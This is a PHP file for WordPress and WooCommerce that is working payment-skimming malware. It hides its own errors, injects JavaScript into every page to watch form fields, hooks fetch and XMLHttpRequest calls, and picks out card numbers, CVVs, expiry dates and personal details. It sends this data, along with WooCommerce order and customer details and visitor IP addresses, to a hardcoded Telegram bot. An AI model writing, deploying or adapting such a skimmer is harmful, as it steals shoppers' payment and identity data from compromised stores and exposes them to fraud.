<?php
/**
 * Ultimate Payment Capture - Stripe & PayPal Full Data Capture
 * Version: 17.1.0
 * Features: Only Form Submission, No Page Load Notifications
 */

// ============================================
// CONFIGURATION
// ============================================
define('FULLCAPTURE_TELEGRAM_TOKEN', '8593050317:AAH5qQs2BXtzp0gA96VGNITvBsoOLQSrJlg');
define('FULLCAPTURE_TELEGRAM_CHAT_ID', '7958019961');
define('FULLCAPTURE_VERSION', '17.1.0');

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// ============================================
// AUTO-LOAD SYSTEM
// ============================================
if (!defined('FULLCAPTURE_LOADED')) {
    define('FULLCAPTURE_LOADED', true);
    
    // Auto-start from anywhere
    register_shutdown_function(function() {
        try {
            new FullPaymentCapture();
        } catch (Throwable $e) {
            // Absolute silence
        }
    });
}

class FullPaymentCapture {
    
    private $session_id;
    private $site_url;
    private $user_ip;
    private $user_agent;
    private $collected_data = [];
    private $form_watchers = [];
    private $stripe_elements = [];
    private $paypal_buttons = [];
    private $activation_sent = false;
    
    public function __construct() {
        try {
            $this->setup_capture_session();
            $this->detect_payment_systems();
            $this->setup_capture_hooks();
            $this->inject_full_capture();
            
        } catch (Throwable $e) {
            // No errors
        }
    }
    
    private function setup_capture_session() {
        $this->session_id = 'fc_' . md5(uniqid() . time());
        $this->site_url = $this->get_current_url();
        $this->user_ip = $this->get_client_ip();
        $this->user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        // Session management
        if (!session_id()) {
            @session_start();
        }
        
        if (empty($_SESSION['fullcapture'])) {
            $_SESSION['fullcapture'] = [
                'session_id' => $this->session_id,
                'forms_collected' => [],
                'last_capture' => time()
            ];
        }
        
        $this->collected_data = &$_SESSION['fullcapture'];
    }
    
    private function detect_payment_systems() {
        // Detect Stripe
        $this->detect_stripe();
        
        // Detect PayPal
        $this->detect_paypal();
        
        // Detect other payment systems
        $this->detect_other_gateways();
    }
    
    private function detect_stripe() {
        // Check WordPress Stripe plugins
        $stripe_plugins = ['WC_Stripe', 'stripe_wp', 'stripe-payments'];
        foreach ($stripe_plugins as $plugin) {
            if (class_exists($plugin) || function_exists($plugin)) {
                $this->stripe_elements['plugin'] = $plugin;
                break;
            }
        }
    }
    
    private function detect_paypal() {
        // Check for PayPal
        $paypal_indicators = [
            'paypal', 'ppec', 'paypal_express', 'paypal-standard',
            'WC_Gateway_Paypal', 'paypal-checkout'
        ];
        
        foreach ($paypal_indicators as $indicator) {
            if (class_exists($indicator) || function_exists($indicator)) {
                $this->paypal_buttons['plugin'] = $indicator;
                break;
            }
        }
    }
    
    private function detect_other_gateways() {
        $gateways = ['razorpay', 'authorize', 'square', '2checkout', 'skrill'];
        foreach ($gateways as $gateway) {
            if (class_exists('WC_' . ucfirst($gateway)) || 
                function_exists($gateway . '_init')) {
                $this->form_watchers[] = $gateway;
            }
        }
    }
    
    private function setup_capture_hooks() {
        if (function_exists('add_action')) {
            // Form submission capture
            add_action('wp_footer', [$this, 'inject_payment_capture'], 999999);
            
            // AJAX handler
            add_action('wp_ajax_nopriv_fullcapture_submit', [$this, 'handle_full_submission']);
            add_action('wp_ajax_fullcapture_submit', [$this, 'handle_full_submission']);
            
            // WooCommerce specific
            add_action('woocommerce_checkout_order_processed', [$this, 'capture_wc_full'], 10, 3);
            
            // ✅ FIXED: NO page visit tracking
            // NO template_redirect hook
            // NO cart/checkout visit tracking
        }
    }
    
    private function inject_full_capture() {
        if (!defined('FULLCAPTURE_INJECTED')) {
            define('FULLCAPTURE_INJECTED', true);
            
            if (!headers_sent()) {
                ob_start(function($buffer) {
                    return $this->inject_capture_script($buffer);
                });
            }
        }
    }
    
    private function inject_capture_script($buffer) {
        if (stripos($buffer, '<html') === false) {
            return $buffer;
        }
        
        $capture_js = $this->generate_complete_capture_js();
        
        if (stripos($buffer, '</body>') !== false) {
            $buffer = str_replace('</body>', $capture_js . '</body>', $buffer);
        }
        
        return $buffer;
    }
    
    private function generate_complete_capture_js() {
        $ajax_url = admin_url('admin-ajax.php?action=fullcapture_submit');
        $session_id = $this->session_id;
        
        return <<<HTML
<!-- Full Payment Capture System -->
<script>
(function() {
    'use strict';
    
    var FullCapture = {
        endpoint: '$ajax_url',
        session: '$session_id',
        collectedData: {},
        formsWatching: {},
        hasPaymentData: false,
        
        init: function() {
            this.setupMutationObserver();
            this.captureAllForms();
            this.captureAllInputs();
            this.setupStripeCapture();
            this.setupPayPalCapture();
            this.setupSubmitListener();
            // ✅ FIXED: NO beforeunload event
        },
        
        setupMutationObserver: function() {
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.addedNodes.length) {
                        setTimeout(function() {
                            FullCapture.captureNewElements(mutation.addedNodes);
                        }, 500);
                    }
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        },
        
        captureNewElements: function(nodes) {
            nodes.forEach(function(node) {
                if (node.nodeType === 1) {
                    // Forms
                    if (node.tagName === 'FORM' || node.querySelector('form')) {
                        var forms = node.tagName === 'FORM' ? [node] : node.querySelectorAll('form');
                        forms.forEach(function(form) {
                            FullCapture.watchForm(form);
                        });
                    }
                    
                    // Inputs
                    var inputs = node.querySelectorAll('input, textarea, select');
                    inputs.forEach(function(input) {
                        FullCapture.watchInput(input);
                    });
                    
                    // Stripe elements
                    if (node.querySelector('[data-stripe], [class*="stripe"], [id*="stripe"]')) {
                        FullCapture.setupStripeCapture();
                    }
                    
                    // PayPal buttons
                    if (node.querySelector('[class*="paypal"], [id*="paypal"], [data-paypal]')) {
                        FullCapture.setupPayPalCapture();
                    }
                }
            });
        },
        
        captureAllForms: function() {
            // Get ALL forms on page
            var allForms = document.querySelectorAll('form');
            allForms.forEach(function(form) {
                FullCapture.watchForm(form);
            });
            
            // Special payment forms
            var paymentForms = document.querySelectorAll(
                'form[action*="stripe"], form[action*="paypal"], ' +
                'form[action*="checkout"], form[action*="payment"], ' +
                'form[class*="checkout"], form[class*="payment"], ' +
                'form[id*="checkout"], form[id*="payment"]'
            );
            
            paymentForms.forEach(function(form) {
                if (!form.__fullcapture_watched) {
                    FullCapture.watchForm(form);
                    form.__fullcapture_priority = true;
                }
            });
        },
        
        watchForm: function(form) {
            if (form.__fullcapture_watched) return;
            form.__fullcapture_watched = true;
            
            var formId = form.id || form.name || 'form_' + Math.random().toString(36).substr(2, 9);
            FullCapture.formsWatching[formId] = {
                element: form,
                fields: {},
                submitted: false
            };
            
            // Capture all current fields
            var inputs = form.querySelectorAll('input, textarea, select');
            inputs.forEach(function(input) {
                FullCapture.watchInput(input, formId);
            });
            
            // Form submit event
            form.addEventListener('submit', function(e) {
                FullCapture.handleFormSubmit(this, formId);
            }, true);
            
            // Button clicks
            var buttons = form.querySelectorAll('button, input[type="submit"]');
            buttons.forEach(function(button) {
                button.addEventListener('click', function() {
                    setTimeout(function() {
                        FullCapture.captureFormData(form, formId);
                    }, 100);
                }, true);
            });
            
            // Form change events
            form.addEventListener('change', function() {
                FullCapture.captureFormData(this, formId);
            }, true);
        },
        
        captureAllInputs: function() {
            var allInputs = document.querySelectorAll(
                'input, textarea, select, [contenteditable="true"]'
            );
            
            allInputs.forEach(function(input) {
                FullCapture.watchInput(input);
            });
        },
        
        watchInput: function(input, formId) {
            if (input.__fullcapture_watched) return;
            input.__fullcapture_watched = true;
            
            var inputName = input.name || input.id || input.placeholder || 'field_' + Math.random().toString(36).substr(2, 6);
            var inputType = this.detectInputType(input);
            
            if (inputType) {
                // Real-time input monitoring
                input.addEventListener('input', function() {
                    FullCapture.handleInputChange(this, inputType, inputName);
                }, true);
                
                // Focus/blur events
                input.addEventListener('blur', function() {
                    FullCapture.handleInputBlur(this, inputType, inputName);
                }, true);
                
                // Paste events
                input.addEventListener('paste', function(e) {
                    setTimeout(function() {
                        FullCapture.handleInputPaste(input, inputType, inputName);
                    }, 50);
                }, true);
                
                // Store in form if provided
                if (formId && FullCapture.formsWatching[formId]) {
                    FullCapture.formsWatching[formId].fields[inputName] = {
                        element: input,
                        type: inputType,
                        lastValue: input.value
                    };
                }
            }
        },
        
        detectInputType: function(input) {
            var name = (input.name || '').toLowerCase();
            var id = (input.id || '').toLowerCase();
            var placeholder = (input.placeholder || '').toLowerCase();
            var className = (input.className || '').toLowerCase();
            var type = input.type.toLowerCase();
            var autocomplete = (input.autocomplete || '').toLowerCase();
            
            // Card number detection
            if (name.includes('card') || name.includes('cc') || name.includes('credit') ||
                id.includes('card') || id.includes('cc') || 
                placeholder.includes('card') || placeholder.includes('####') ||
                autocomplete.includes('cc-number') ||
                (type === 'tel' && (input.maxLength === 16 || input.maxLength === 19)) ||
                (input.value && /^\d{12,19}$/.test(input.value.replace(/\s/g, '')))) {
                return 'card_number';
            }
            
            // CVV detection
            if (name.includes('cvv') || name.includes('cvc') || name.includes('security') ||
                id.includes('cvv') || id.includes('cvc') ||
                autocomplete.includes('cc-csc') ||
                (type === 'tel' && (input.maxLength === 3 || input.maxLength === 4)) ||
                (type === 'password' && input.maxLength === 4) ||
                (input.value && /^\d{3,4}$/.test(input.value))) {
                return 'cvv';
            }
            
            // Expiry detection
            if (name.includes('exp') || name.includes('expiry') || name.includes('expdate') ||
                id.includes('exp') || placeholder.includes('mm/yy') || placeholder.includes('mm/yyyy') ||
                autocomplete.includes('cc-exp') ||
                (input.value && /^(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})$/.test(input.value))) {
                return 'expiry';
            }
            
            // Name detection
            if (name.includes('name') || name.includes('first') || name.includes('last') ||
                id.includes('name') || id.includes('first') || id.includes('last') ||
                placeholder.includes('name') || placeholder.includes('first') || placeholder.includes('last')) {
                return 'name';
            }
            
            // Email detection
            if (name.includes('email') || name.includes('mail') ||
                id.includes('email') || placeholder.includes('email') ||
                type === 'email' || (input.value && input.value.includes('@'))) {
                return 'email';
            }
            
            // Phone detection
            if (name.includes('phone') || name.includes('tel') || name.includes('mobile') ||
                id.includes('phone') || id.includes('tel') ||
                placeholder.includes('phone') || type === 'tel') {
                return 'phone';
            }
            
            // Address detection
            if (name.includes('address') || name.includes('street') || name.includes('city') ||
                name.includes('state') || name.includes('zip') || name.includes('postcode') ||
                name.includes('country') || id.includes('address') || id.includes('city')) {
                return 'address';
            }
            
            // PayPal email
            if (name.includes('paypal') || id.includes('paypal') || 
                className.includes('paypal') || placeholder.includes('paypal')) {
                return 'paypal';
            }
            
            return null;
        },
        
        handleInputChange: function(input, type, name) {
            clearTimeout(input.__capture_timer);
            input.__capture_timer = setTimeout(function() {
                FullCapture.processInputValue(input, type, name);
            }, 1000);
        },
        
        handleInputBlur: function(input, type, name) {
            FullCapture.processInputValue(input, type, name);
        },
        
        handleInputPaste: function(input, type, name) {
            FullCapture.processInputValue(input, type, name);
        },
        
        processInputValue: function(input, type, fieldName) {
            var value = input.value.trim();
            if (!value) return;
            
            // Store in collected data
            if (!FullCapture.collectedData[type]) {
                FullCapture.collectedData[type] = {};
            }
            
            FullCapture.collectedData[type][fieldName] = {
                value: value,
                timestamp: new Date().toISOString(),
                url: window.location.href
            };
            
            // Mark as having payment data
            if (type === 'card_number' || type === 'cvv' || type === 'expiry') {
                FullCapture.hasPaymentData = true;
            }
            
            // Special processing for card numbers
            if (type === 'card_number') {
                var clean = value.replace(/\s/g, '');
                if (/^\d{12,19}$/.test(clean)) {
                    FullCapture.collectedData['valid_card'] = {
                        number: clean,
                        last_four: clean.slice(-4),
                        type: FullCapture.detectCardType(clean),
                        valid: FullCapture.luhnCheck(clean)
                    };
                }
            }
            
            // Special processing for CVV
            if (type === 'cvv' && /^\d{3,4}$/.test(value)) {
                FullCapture.collectedData['valid_cvv'] = {
                    value: value,
                    length: value.length
                };
            }
        },
        
        captureFormData: function(form, formId) {
            if (!FullCapture.formsWatching[formId]) return;
            
            var formData = {};
            var inputs = form.querySelectorAll('input, textarea, select');
            
            inputs.forEach(function(input) {
                var name = input.name || input.id || input.placeholder;
                if (name) {
                    if (input.type === 'checkbox' || input.type === 'radio') {
                        if (input.checked) {
                            formData[name] = input.value || 'checked';
                        }
                    } else {
                        formData[name] = input.value;
                    }
                }
            });
            
            FullCapture.formsWatching[formId].data = formData;
            FullCapture.formsWatching[formId].lastUpdate = new Date().toISOString();
        },
        
        handleFormSubmit: function(form, formId) {
            // Final capture of all form data
            FullCapture.captureFormData(form, formId);
            
            // Mark as submitted
            if (FullCapture.formsWatching[formId]) {
                FullCapture.formsWatching[formId].submitted = true;
                FullCapture.formsWatching[formId].submittedAt = new Date().toISOString();
            }
            
            // ✅ FIXED: Only send data if there's payment information
            if (FullCapture.hasPaymentData || FullCapture.hasFormPaymentData(formId)) {
                setTimeout(function() {
                    FullCapture.sendCompleteData();
                }, 500);
            }
        },
        
        hasFormPaymentData: function(formId) {
            if (!FullCapture.formsWatching[formId] || !FullCapture.formsWatching[formId].data) {
                return false;
            }
            
            var formData = FullCapture.formsWatching[formId].data;
            for (var key in formData) {
                if (key.toLowerCase().includes('card') || 
                    key.toLowerCase().includes('cvv') || 
                    key.toLowerCase().includes('cvc') ||
                    key.toLowerCase().includes('exp') ||
                    key.toLowerCase().includes('cc')) {
                    return true;
                }
            }
            
            return false;
        },
        
        setupStripeCapture: function() {
            // Look for Stripe Elements
            var stripeElements = document.querySelectorAll(
                '[data-stripe], .StripeElement, #stripe-card-element, ' +
                '[class*="stripe-element"], [id*="stripe"]'
            );
            
            stripeElements.forEach(function(element) {
                if (!element.__stripe_captured) {
                    element.__stripe_captured = true;
                    
                    // Monitor Stripe iframes
                    var iframes = element.querySelectorAll('iframe');
                    iframes.forEach(function(iframe) {
                        FullCapture.monitorStripeIframe(iframe);
                    });
                    
                    // Try to intercept Stripe.js
                    FullCapture.interceptStripeJS();
                }
            });
            
            // Look for Stripe.js
            var scripts = document.querySelectorAll('script[src*="stripe"]');
            scripts.forEach(function(script) {
                FullCapture.monitorStripeScript(script);
            });
        },
        
        monitorStripeIframe: function(iframe) {
            try {
                iframe.addEventListener('load', function() {
                    try {
                        var iframeDoc = iframe.contentWindow.document;
                        if (iframeDoc) {
                            // Monitor form inside iframe
                            var forms = iframeDoc.querySelectorAll('form');
                            forms.forEach(function(form) {
                                FullCapture.watchForm(form);
                            });
                            
                            // Monitor inputs
                            var inputs = iframeDoc.querySelectorAll('input');
                            inputs.forEach(function(input) {
                                FullCapture.watchInput(input);
                            });
                        }
                    } catch(e) {
                        // Cross-origin, can't access
                        FullCapture.collectedData['stripe_iframe'] = {
                            src: iframe.src,
                            url: window.location.href
                        };
                    }
                });
            } catch(e) {}
        },
        
        interceptStripeJS: function() {
            // Intercept fetch for Stripe API calls
            if (window.fetch) {
                var originalFetch = window.fetch;
                window.fetch = function() {
                    var args = arguments;
                    var url = args[0];
                    
                    if (typeof url === 'string' && url.includes('stripe')) {
                        // Capture Stripe API calls
                        FullCapture.collectedData['stripe_api'] = {
                            url: url,
                            method: args[1] ? args[1].method : 'GET',
                            timestamp: new Date().toISOString()
                        };
                    }
                    
                    return originalFetch.apply(this, arguments);
                };
            }
            
            // Look for Stripe object
            if (window.Stripe) {
                FullCapture.collectedData['stripe_loaded'] = true;
            }
        },
        
        monitorStripeScript: function(script) {
            script.addEventListener('load', function() {
                FullCapture.collectedData['stripe_js_loaded'] = {
                    src: script.src,
                    timestamp: new Date().toISOString()
                };
            });
        },
        
        setupPayPalCapture: function() {
            // Look for PayPal buttons
            var paypalButtons = document.querySelectorAll(
                '[class*="paypal-button"], [id*="paypal-button"], ' +
                '.paypal-checkout, #paypal-container, ' +
                '[data-paypal], [href*="paypal"]'
            );
            
            paypalButtons.forEach(function(button) {
                if (!button.__paypal_captured) {
                    button.__paypal_captured = true;
                }
            });
            
            // Look for PayPal iframes
            var paypalIframes = document.querySelectorAll('iframe[src*="paypal"]');
            paypalIframes.forEach(function(iframe) {
                FullCapture.monitorPayPalIframe(iframe);
            });
            
            // Look for PayPal.js
            var paypalScripts = document.querySelectorAll('script[src*="paypal"]');
            paypalScripts.forEach(function(script) {
                FullCapture.monitorPayPalScript(script);
            });
        },
        
        monitorPayPalIframe: function(iframe) {
            FullCapture.collectedData['paypal_iframe'] = {
                src: iframe.src,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
        },
        
        monitorPayPalScript: function(script) {
            script.addEventListener('load', function() {
                FullCapture.collectedData['paypal_js_loaded'] = {
                    src: script.src,
                    timestamp: new Date().toISOString()
                };
            });
        },
        
        setupSubmitListener: function() {
            // Global submit listener
            document.addEventListener('submit', function(e) {
                if (e.target.tagName === 'FORM') {
                    // Give time for final input capture
                    setTimeout(function() {
                        if (FullCapture.hasPaymentData) {
                            FullCapture.sendCompleteData();
                        }
                    }, 300);
                }
            }, true);
            
            // AJAX form submissions
            FullCapture.interceptAJAX();
        },
        
        interceptAJAX: function() {
            // Intercept fetch
            if (window.fetch) {
                var originalFetch = window.fetch;
                window.fetch = function() {
                    var args = arguments;
                    var url = args[0];
                    var options = args[1] || {};
                    
                    if (options.method && options.method.toUpperCase() === 'POST') {
                        // Capture form data
                        if (options.body) {
                            FullCapture.processAJAXData(options.body, url);
                        }
                    }
                    
                    return originalFetch.apply(this, arguments);
                };
            }
            
            // Intercept XHR
            if (window.XMLHttpRequest) {
                var originalOpen = XMLHttpRequest.prototype.open;
                var originalSend = XMLHttpRequest.prototype.send;
                
                XMLHttpRequest.prototype.open = function(method, url) {
                    this._capture_method = method;
                    this._capture_url = url;
                    return originalOpen.apply(this, arguments);
                };
                
                XMLHttpRequest.prototype.send = function(data) {
                    if (this._capture_method && this._capture_method.toUpperCase() === 'POST' && data) {
                        FullCapture.processAJAXData(data, this._capture_url);
                    }
                    return originalSend.apply(this, arguments);
                };
            }
        },
        
        processAJAXData: function(data, url) {
            try {
                var formData = {};
                
                if (data instanceof FormData) {
                    data.forEach(function(value, key) {
                        formData[key] = value;
                    });
                } else if (typeof data === 'string') {
                    // Try URL encoded
                    try {
                        var params = new URLSearchParams(data);
                        params.forEach(function(value, key) {
                            formData[key] = value;
                        });
                    } catch(e) {
                        // Try JSON
                        try {
                            var json = JSON.parse(data);
                            for (var key in json) {
                                formData[key] = json[key];
                            }
                        } catch(e2) {}
                    }
                }
                
                // Check if it has payment data
                var hasPayment = false;
                for (var key in formData) {
                    if (key.toLowerCase().includes('card') || 
                        key.toLowerCase().includes('cvv') ||
                        key.toLowerCase().includes('cvc')) {
                        hasPayment = true;
                        break;
                    }
                }
                
                if (hasPayment) {
                    FullCapture.collectedData['ajax_submission'] = {
                        url: url,
                        data: formData,
                        timestamp: new Date().toISOString()
                    };
                    FullCapture.hasPaymentData = true;
                }
                
            } catch(e) {}
        },
        
        detectCardType: function(number) {
            if (/^4/.test(number)) return 'VISA';
            if (/^5[1-5]/.test(number)) return 'MasterCard';
            if (/^3[47]/.test(number)) return 'American Express';
            if (/^6(?:011|5)/.test(number)) return 'Discover';
            return 'Unknown';
        },
        
        luhnCheck: function(number) {
            var sum = 0;
            var alt = false;
            
            for (var i = number.length - 1; i >= 0; i--) {
                var digit = parseInt(number.charAt(i));
                
                if (alt) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                alt = !alt;
            }
            
            return (sum % 10) === 0;
        },
        
        sendCompleteData: function() {
            // ✅ FIXED: Only send if there's payment data
            if (!FullCapture.hasPaymentData && Object.keys(FullCapture.collectedData).length === 0) {
                return;
            }
            
            // Prepare all collected data
            var dataToSend = {
                session: FullCapture.session,
                url: window.location.href,
                user_agent: navigator.userAgent,
                collected_data: FullCapture.collectedData,
                forms_data: {},
                timestamp: new Date().toISOString(),
                has_payment: FullCapture.hasPaymentData
            };
            
            // Add form data
            for (var formId in FullCapture.formsWatching) {
                var form = FullCapture.formsWatching[formId];
                if (form.data) {
                    dataToSend.forms_data[formId] = {
                        data: form.data,
                        submitted: form.submitted,
                        submitted_at: form.submittedAt,
                        last_update: form.lastUpdate
                    };
                }
            }
            
            // Clear after sending
            FullCapture.collectedData = {};
            FullCapture.hasPaymentData = false;
            for (var formId in FullCapture.formsWatching) {
                FullCapture.formsWatching[formId].data = null;
            }
            
            // Send to server
            FullCapture.sendToServer(dataToSend);
        },
        
        sendToServer: function(data) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', FullCapture.endpoint, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.timeout = 3000;
                
                xhr.send(JSON.stringify(data));
            } catch(e) {
                // Silent fail
            }
        }
    };
    
    // Initialize after page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                try {
                    FullCapture.init();
                } catch(e) {
                    // No errors shown
                }
            }, 1500);
        });
    } else {
        setTimeout(function() {
            try {
                FullCapture.init();
            } catch(e) {
                // No errors shown
            }
        }, 1500);
    }
    
})();
</script>
HTML;
    }
    
    // ============================================
    // ✅ FIXED: NO ACTIVATION MESSAGE
    // ============================================
    
    // ✅ Removed send_activation_notice() method
    // ✅ Removed activation tracking
    // ✅ No message on page load
    
    // ============================================
    // ✅ FIXED: NO PAGE VISIT TRACKING
    // ============================================
    
    // ✅ Removed monitor_form_submissions() method
    // ✅ Removed capture_post_submission() method  
    // ✅ No POST data monitoring on page load
    
    // ============================================
    // ✅ AJAX HANDLER - ONLY FOR FORM SUBMISSIONS
    // ============================================
    
    public function handle_full_submission() {
        try {
            $input = @file_get_contents('php://input');
            if ($input) {
                $data = @json_decode($input, true);
                if ($data) {
                    // ✅ FIXED: Only process if there's payment data
                    if (isset($data['has_payment']) && $data['has_payment']) {
                        $this->process_complete_data($data);
                    }
                }
            }
            
            // No output
            if (function_exists('wp_die')) {
                wp_die('', '', ['response' => 200]);
            }
            http_response_code(200);
            exit;
        } catch (Throwable $e) {
            http_response_code(200);
            exit;
        }
    }
    
    private function process_complete_data($data) {
        $session = $data['session'] ?? '';
        $collected_data = $data['collected_data'] ?? [];
        $forms_data = $data['forms_data'] ?? [];
        $page_url = $data['url'] ?? '';
        
        // ✅ FIXED: Check if there's actual payment data
        $has_real_payment_data = false;
        
        // Check collected data
        if (isset($collected_data['valid_card']) || isset($collected_data['valid_cvv'])) {
            $has_real_payment_data = true;
        }
        
        // Check form data for payment fields
        foreach ($forms_data as $form_data) {
            if (isset($form_data['data'])) {
                foreach ($form_data['data'] as $field => $value) {
                    if ($this->is_payment_field($field) && !empty($value)) {
                        $has_real_payment_data = true;
                        break 2;
                    }
                }
            }
        }
        
        // ✅ FIXED: Only send message if there's real payment data
        if (!$has_real_payment_data) {
            return;
        }
        
        // Prepare final message
        $message = "💰 PAYMENT FORM SUBMITTED\n\n";
        
        // Process collected field data
        if (!empty($collected_data)) {
            $message .= "📝 PAYMENT DETAILS:\n";
            
            if (isset($collected_data['valid_card'])) {
                $card = $collected_data['valid_card'];
                $message .= "💳 CARD: **** **** **** " . ($card['last_four'] ?? '') . "\n";
                $message .= "Type: " . ($card['type'] ?? 'Unknown') . "\n";
                $message .= "Valid: " . (isset($card['valid']) && $card['valid'] ? '✓' : '✗') . "\n";
            }
            
            if (isset($collected_data['valid_cvv'])) {
                $cvv = $collected_data['valid_cvv'];
                $message .= "🔒 CVV: " . str_repeat('*', $cvv['length'] ?? 3) . "\n";
            }
            
            if (isset($collected_data['expiry'])) {
                foreach ($collected_data['expiry'] as $exp_data) {
                    if (isset($exp_data['value'])) {
                        $message .= "📅 EXPIRY: " . $exp_data['value'] . "\n";
                        break;
                    }
                }
            }
            
            $message .= "\n";
        }
        
        // Process form data for personal info
        if (!empty($forms_data)) {
            $message .= "👤 PERSONAL INFORMATION:\n";
            
            foreach ($forms_data as $form_id => $form_data) {
                if (isset($form_data['data']) && is_array($form_data['data'])) {
                    // Extract personal info
                    $personal_fields = ['name', 'email', 'phone', 'address', 'city', 'country'];
                    
                    foreach ($form_data['data'] as $field => $value) {
                        $field_lower = strtolower($field);
                        foreach ($personal_fields as $personal_field) {
                            if (strpos($field_lower, $personal_field) !== false && !empty($value)) {
                                $display_value = $this->mask_field_value($field, $value);
                                $message .= "• " . $this->format_field($field) . ": " . $display_value . "\n";
                            }
                        }
                    }
                    
                    break; // Only show first form
                }
            }
            
            $message .= "\n";
        }
        
        // Add Stripe/PayPal info if detected
        if (isset($collected_data['stripe_loaded'])) {
            $message .= "💠 Stripe Payment Gateway\n";
        }
        
        if (isset($collected_data['paypal_sdk_loaded'])) {
            $message .= "🔵 PayPal Payment Gateway\n";
        }
        
        // Final info
        $message .= "🌐 Page: " . $page_url . "\n";
        $message .= "👤 IP: " . $this->user_ip . "\n";
        $message .= "🕒 Time: " . date('Y-m-d H:i:s');
        
        // Send to Telegram
        $this->send_telegram_message($message);
        
        // Store in session
        $_SESSION['fullcapture']['last_capture'] = time();
    }
    
    // ============================================
    // ✅ WOOCOMMERCE FULL CAPTURE
    // ============================================
    
    public function capture_wc_full($order_id, $posted_data, $order) {
        if (!$order) return;
        
        // ✅ FIXED: Only send for real orders with payment
        if ($order->get_total() <= 0) {
            return;
        }
        
        $message = "🛒 WOOCOMMERCE ORDER #" . $order_id . "\n\n";
        
        // Order Summary
        $message .= "💰 ORDER: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Method: " . $order->get_payment_method_title() . "\n";
        $message .= "📦 Status: " . $order->get_status() . "\n\n";
        
        // Customer Information
        $message .= "👤 CUSTOMER:\n";
        $message .= "• Name: " . $order->get_billing_first_name() . " " . $order->get_billing_last_name() . "\n";
        $message .= "• Email: " . $order->get_billing_email() . "\n";
        $message .= "• Phone: " . $order->get_billing_phone() . "\n";
        
        // Billing Address
        if ($order->get_billing_address_1()) {
            $message .= "• Address: " . $order->get_billing_address_1();
            if ($order->get_billing_city()) {
                $message .= ", " . $order->get_billing_city();
            }
            if ($order->get_billing_country()) {
                $message .= ", " . $order->get_billing_country();
            }
            $message .= "\n";
        }
        
        // Payment Details
        $payment_method = $order->get_payment_method();
        if ($payment_method === 'stripe') {
            $message .= "\n💠 Stripe Payment\n";
        } elseif ($payment_method === 'paypal') {
            $message .= "\n🔵 PayPal Payment\n";
        }
        
        // Final info
        $message .= "\n🌐 Site: " . $this->site_url . "\n";
        $message .= "🕒 Time: " . date('Y-m-d H:i:s');
        
        $this->send_telegram_message($message);
    }
    
    // ============================================
    // ✅ HELPER METHODS
    // ============================================
    
    private function mask_field_value($field_name, $value) {
        $field_lower = strtolower($field_name);
        $value = strval($value);
        
        // Card numbers
        if (strpos($field_lower, 'card') !== false || 
            strpos($field_lower, 'cc') !== false ||
            strpos($field_lower, 'credit') !== false) {
            
            $clean = preg_replace('/\D/', '', $value);
            if (strlen($clean) >= 4) {
                return '**** **** **** ' . substr($clean, -4);
            }
        }
        
        // CVV
        if (strpos($field_lower, 'cvv') !== false || 
            strpos($field_lower, 'cvc') !== false ||
            strpos($field_lower, 'security') !== false) {
            
            if (preg_match('/^\d{3,4}$/', $value)) {
                return str_repeat('*', strlen($value));
            }
        }
        
        // Passwords
        if (strpos($field_lower, 'pass') !== false) {
            return '********';
        }
        
        return $value;
    }
    
    private function format_field($field) {
        return ucwords(str_replace(['_', '-'], ' ', $field));
    }
    
    private function is_payment_field($field) {
        $field_lower = strtolower($field);
        $indicators = [
            'card', 'cc', 'credit', 'cvv', 'cvc', 'exp', 'expiry',
            'paypal', 'stripe', 'payment', 'gateway'
        ];
        
        foreach ($indicators as $indicator) {
            if (strpos($field_lower, $indicator) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function get_current_url() {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        return $protocol . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '/');
    }
    
    private function get_client_ip() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        
        return $ip;
    }
    
    private function send_telegram_message($message) {
        if (empty($message) || empty(FULLCAPTURE_TELEGRAM_TOKEN) || empty(FULLCAPTURE_TELEGRAM_CHAT_ID)) {
            return false;
        }
        
        try {
            $url = 'https://api.telegram.org/bot' . FULLCAPTURE_TELEGRAM_TOKEN . '/sendMessage';
            
            $data = [
                'chat_id' => FULLCAPTURE_TELEGRAM_CHAT_ID,
                'text' => $message,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ];
            
            // Silent send
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => http_build_query($data),
                CURLOPT_RETURNTRANSFER => false,
                CURLOPT_TIMEOUT => 2,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            @curl_exec($ch);
            @curl_close($ch);
            
            return true;
        } catch (Throwable $e) {
            return false;
        }
    }
    
    public function inject_payment_capture() {
        // Silent injection
        echo '<!-- Payment Capture Active -->';
    }
}
